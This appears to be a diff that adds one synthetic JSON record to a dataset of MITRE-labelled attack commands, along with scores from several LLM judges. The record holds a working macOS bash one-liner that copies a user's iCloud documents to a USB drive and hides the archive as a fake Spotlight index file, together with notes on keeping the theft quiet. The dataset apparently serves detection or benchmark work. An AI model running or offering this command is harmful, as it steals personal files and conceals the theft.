@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library/Mobile Documents\" 2>/dev/null | dd of=\"/Volumes/NO\\ NAME/.Spotlight-V100/Store-V2/.store.db\" bs=4m conv=sync,noerror && sync",
+  "explanation": "Captures iCloud-synced files from Mobile Documents, suppresses permission errors, and writes to a Spotlight metadata-looking file on an external volume via dd.",
+  "rationale_steps": [
+    "Collect potentially sensitive synced files into a compressed stream.",
+    "Ignore inaccessible items to keep operation quiet.",
+    "Write the data into a path resembling system index files on the USB.",
+    "Sync to finalize the offline staging."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-13a9d05e",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid flags, proper piping and redirection; the backslash inside a quoted path is unnecessary but not a syntax error.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives iCloud Mobile Documents and writes to a stealthy-looking file on an external volume consistent with T1052, but the escaped space within quotes and possible nonexistence or permissions of the Spotlight path could cause failure.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T07:36:41.793202Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for both tar and dd commands, correct piping, error redirection, and proper escaping of spaces in the output path.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing user's iCloud documents and exfiltrating them to a hidden-looking file on an external volume that mimics system metadata to avoid detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:36:44.926562Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed and parseable by Bash; the backslash in `NO\\ NAME` within double quotes is treated as a literal character when interpreted as a path string.",
+        "semantic_score": 3,
+        "semantic_justification": "While the overall approach, tool choices, and obfuscation are well-aligned with the technique, the specific path `\"/Volumes/NO\\ NAME/...\"` is highly likely to be semantically incorrect for a standard macOS external volume named 'NO NAME', causing the command to fail to write to the intended location.",
+        "combined_score": 4.0,
+        "confidence": null,
+        "timestamp": "2025-10-01T07:37:05.291629Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
